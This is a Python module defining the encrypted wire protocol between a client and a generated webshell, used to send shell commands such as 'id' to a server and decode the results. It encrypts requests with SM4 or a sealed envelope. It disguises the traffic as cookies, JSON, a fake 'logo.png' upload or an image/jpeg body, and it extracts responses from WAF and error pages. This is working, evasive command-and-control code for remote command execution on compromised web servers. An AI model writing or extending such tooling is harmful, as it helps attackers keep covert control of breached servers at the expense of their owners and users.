"""Wire protocol shared by the client and the generated webshell.

Request
-------
JSON object -> SM4-CBC (PKCS#7) -> base64 -> HTTP body

    {"op": "cmd", "text": "id", "cwd": "/var/www"}

Transport is either a form field (``data=<urlencoded b64>``) or the raw body
(``<b64>``); the server accepts both, so older shells keep working.

Response
--------
base64 -> SM4-CBC -> JSON

    {"code": 0, "msg": "ok", "data": {...}}

Anything that is not valid ciphertext (PHP notices, WAF pages, ...) raises
:class:`ProtocolError` with a readable snippet.
"""

from __future__ import annotations

import base64
import binascii
import os
import json
import re
import time
from urllib.parse import quote_plus, unquote_plus
from dataclasses import dataclass, field
from typing import Any, Iterable

from .crypto import sm4

PROTOCOL_VERSION = 1

B64_RE = re.compile(r"[A-Za-z0-9+/=]{24,}")
JSON_MARKER = b'"code"'


class ProtocolError(Exception):
    """Raised when a response cannot be decoded / parsed."""

    def __init__(self, message: str, raw: str = "") -> None:
        super().__init__(message)
        self.raw = raw

    def snippet(self, limit: int = 240) -> str:
        text = " ".join(self.raw.split())
        return text[:limit]


@dataclass
class Response:
    code: int = 0
    msg: str = "ok"
    data: dict[str, Any] = field(default_factory=dict)
    raw: bytes = b""
    elapsed: float = 0.0

    @property
    def ok(self) -> bool:
        return self.code == 0


def _key_bytes(value: str | bytes) -> bytes:
    if isinstance(value, bytes):
        return value
    text = value.strip()
    # accept 32 hex chars or a base64 blob or a raw 16 char passphrase
    if re.fullmatch(r"[0-9a-fA-F]{32}", text):
        return bytes.fromhex(text)
    try:
        raw = base64.b64decode(text, validate=True)
        if len(raw) == 16:
            return raw
    except (binascii.Error, ValueError):
        pass
    raw = text.encode("utf-8")
    if len(raw) != 16:
        raise ValueError(
            "key/iv must be 16 raw bytes, 32 hex chars or base64 of 16 bytes "
            f"(got {len(raw)} bytes)"
        )
    return raw


def normalize_secret(value: str | bytes) -> bytes:
    return _key_bytes(value)


def b64e(data: bytes) -> str:
    return base64.b64encode(data).decode("ascii")


def b64d(text: str) -> bytes:
    cleaned = re.sub(r"[^A-Za-z0-9+/=]", "", text)
    cleaned = cleaned.replace("-", "+").replace("_", "/")
    if len(cleaned) % 4:
        cleaned += "=" * (4 - len(cleaned) % 4)
    return base64.b64decode(cleaned)


def build_payload(op: str, **fields: Any) -> dict[str, Any]:
    payload: dict[str, Any] = {"op": op, "v": PROTOCOL_VERSION, "ts": int(time.time())}
    for key, value in fields.items():
        if value is not None:
            payload[key] = value
    return payload


def encode_request(payload: dict[str, Any], key: str | bytes, iv: str | bytes) -> str:
    """Serialise + encrypt a request; returns the base64 carrier string."""
    body = json.dumps(payload, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
    cipher = sm4.cbc_encrypt(body, _key_bytes(key), _key_bytes(iv))
    return b64e(cipher)


def _decrypt_json(candidate: str, key: bytes, iv: bytes) -> dict[str, Any] | None:
    try:
        cipher = b64d(candidate)
    except (binascii.Error, ValueError):
        return None
    if not cipher or len(cipher) % 16:
        return None
    try:
        plain = sm4.cbc_decrypt(cipher, key, iv)
    except Exception:
        return None
    try:
        parsed = json.loads(plain.decode("utf-8", "replace"))
    except json.JSONDecodeError:
        return None
    return parsed if isinstance(parsed, dict) else None


def decode_response(
    text: str,
    key: str | bytes,
    iv: str | bytes,
    *,
    elapsed: float = 0.0,
) -> Response:
    """Decrypt a response body, tolerating leading/trailing garbage."""
    if not text or not text.strip():
        raise ProtocolError("empty response", text)
    key_b = _key_bytes(key)
    iv_b = _key_bytes(iv)

    stripped = "".join(text.split())
    parsed = _decrypt_json(stripped, key_b, iv_b)

    if parsed is None:
        # WAF banners / PHP notices often wrap the real payload; try every long
        # base64-looking run, longest first.
        candidates: Iterable[str] = sorted(
            {m.group(0) for m in B64_RE.finditer(text)}, key=len, reverse=True
        )
        for candidate in candidates:
            parsed = _decrypt_json(candidate, key_b, iv_b)
            if parsed is not None and "code" in parsed:
                break
            parsed = None

    if parsed is None or "code" not in parsed:
        raise ProtocolError("response is not valid SM4 payload (bad key/iv or WAF page)", text)

    return Response(
        code=int(parsed.get("code", 0)),
        msg=str(parsed.get("msg", "")),
        data=parsed.get("data") or {},
        raw=text.encode("utf-8", "replace"),
        elapsed=elapsed,
    )


def decode_shell_side(blob: bytes, key: str | bytes, iv: str | bytes) -> dict[str, Any]:
    """Decrypt an incoming request body (used by the bundled test server)."""
    text = blob.decode("utf-8", "replace").strip()
    form_value = None
    if "=" in text:
        # form style: data=<b64>&x=1  (raw carriers are never url-encoded)
        parts = {}
        for part in text.split("&"):
            name, _, value = part.partition("=")
            parts[name.strip()] = value
        for name in ("data", "pass", "key"):
            if name in parts:
                form_value = parts[name]
                break
    if form_value is not None:
        text = unquote_plus(form_value)
    text = text.strip()
    parsed = _decrypt_json(text, _key_bytes(key), _key_bytes(iv))
    if parsed is None:
        raise ProtocolError("cannot decrypt request", text[:400])
    return parsed


def encode_shell_side(payload: dict[str, Any], key: str | bytes, iv: str | bytes) -> str:
    body = json.dumps(payload, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
    return b64e(sm4.cbc_encrypt(body, _key_bytes(key), _key_bytes(iv)))


# ---------------------------------------------------------------------------
# v2: authenticated envelope + pluggable carriers
# ---------------------------------------------------------------------------

from .crypto import envelope  # noqa: E402

CARRIERS = ("form", "raw", "json", "cookie", "multipart", "bin")

CARRIER_CONTENT_TYPES = {
    "form": "application/x-www-form-urlencoded",
    "raw": "text/plain; charset=UTF-8",
    "json": "application/json; charset=utf-8",
    "cookie": "text/html; charset=utf-8",
    "multipart": "multipart/form-data",
    "bin": "image/jpeg",
}


@dataclass
class WireRequest:
    method: str
    body: bytes
    headers: dict[str, str]
    carrier: str = "form"


def _pad_payload(payload: dict[str, Any], pad_bucket: int) -> dict[str, Any]:
    if not pad_bucket:
        return payload
    buckets = tuple(b for b in envelope._DEFAULT_PAD_BUCKETS if b >= pad_bucket) or (pad_bucket,)
    return envelope.maybe_pad(payload, buckets)


def build_v2_body(
    payload: dict[str, Any],
    secret_hex: str,
    salt_hex: str,
    *,
    carrier: str = "form",
    pass_param: str = "data",
    pad_bucket: int = 0,
) -> WireRequest:
    """Seal a v2 payload and wrap it in the requested carrier."""
    payload = dict(payload)
    payload["v"] = 2
    payload = _pad_payload(payload, pad_bucket)
    body_json = json.dumps(payload, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
    blob = envelope.seal(body_json, secret_hex, salt_hex)
    b64 = b64e(blob)

    if carrier == "form":
        return WireRequest(
            "POST",
            f"{pass_param}={quote_plus(b64)}".encode("ascii"),
            {"Content-Type": CARRIER_CONTENT_TYPES["form"]},
            carrier,
        )
    if carrier == "raw":
        return WireRequest("POST", b64.encode("ascii"), {"Content-Type": CARRIER_CONTENT_TYPES["raw"]}, carrier)
    if carrier == "json":
        body = json.dumps({"q": b64, "t": int(time.time())}, separators=(",", ":")).encode("utf-8")
        return WireRequest("POST", body, {"Content-Type": CARRIER_CONTENT_TYPES["json"]}, carrier)
    if carrier == "cookie":
        return WireRequest(
            "GET",
            b"",
            {
                "Cookie": f"{pass_param}={_cookie_safe(b64)}",
                "Content-Type": CARRIER_CONTENT_TYPES["cookie"],
            },
            carrier,
        )
    if carrier == "multipart":
        boundary = "----WebKitFormBoundary" + b64e(os.urandom(8)).replace("+", "A").replace("/", "B")
        name = pass_param
        head = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{name}"; filename="logo.png"\r\n'
            f"Content-Type: image/png\r\n\r\n"
        ).encode("ascii")
        tail = f"\r\n--{boundary}--\r\n".encode("ascii")
        return WireRequest(
            "POST",
            head + b64.encode("ascii") + tail,
            {"Content-Type": f"multipart/form-data; boundary={boundary}"},
            carrier,
        )
    if carrier == "bin":
        return WireRequest("POST", blob, {"Content-Type": CARRIER_CONTENT_TYPES["bin"]}, carrier)
    raise ValueError(f"unknown carrier: {carrier}")


def _cookie_safe(b64: str) -> str:
    return b64.replace("+", "-").replace("/", "_").rstrip("=")


def decode_response_v2(
    text: str,
    secret_hex: str,
    salt_hex: str,
    *,
    elapsed: float = 0.0,
    skew: int = envelope.MAX_SKEW,
) -> Response:
    """Unwrap the JSON wrapper, or fall back to a raw base64 blob."""
    candidates: list[str] = []
    stripped = text.strip()
    if not stripped:
        raise ProtocolError("empty response", text)

    try:
        wrapper = json.loads(stripped)
    except json.JSONDecodeError:
        wrapper = None
    if isinstance(wrapper, dict):
        for key in ("d", "r", "q", "data"):
            value = wrapper.get(key)
            if isinstance(value, str) and len(value) > 32:
                candidates.append(value)
    if stripped.startswith("{") is False:
        candidates.append(stripped)
    candidates.extend(sorted({m.group(0) for m in B64_RE.finditer(text)}, key=len, reverse=True))

    last_error: Exception | None = None
    for candidate in candidates:
        for raw in (candidate, _cookie_safe_inverse(candidate)):
            try:
                blob = b64d(raw)
            except (binascii.Error, ValueError):
                continue
            try:
                plain = envelope.open_(blob, secret_hex, salt_hex, skew=skew)
            except Exception as exc:  # noqa: BLE001 - try the next candidate
                last_error = exc
                continue
            try:
                parsed = json.loads(plain.decode("utf-8", "replace"))
            except json.JSONDecodeError:
                continue
            if isinstance(parsed, dict) and "code" in parsed:
                return Response(
                    code=int(parsed.get("code", 0)),
                    msg=str(parsed.get("msg", "")),
                    data=parsed.get("data") or {},
                    raw=text.encode("utf-8", "replace"),
                    elapsed=elapsed,
                )
    raise ProtocolError(
        f"v2 response rejected ({last_error or 'no candidate decrypted'}) — wrong secret/salt, "
        "stale clock, or a blocking page",
        text,
    )


def _cookie_safe_inverse(value: str) -> str:
    text = value.replace("-", "+").replace("_", "/")
    if len(text) % 4:
        text += "=" * (4 - len(text) % 4)
    return text


def encode_response_v2(payload: dict[str, Any], secret_hex: str, salt_hex: str) -> str:
    """Server-side helper (tests / reference implementation)."""
    body = json.dumps(payload, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
    blob = envelope.seal(body, secret_hex, salt_hex)
    return json.dumps({"s": "ok", "t": int(time.time()), "d": b64e(blob)}, separators=(",", ":"))
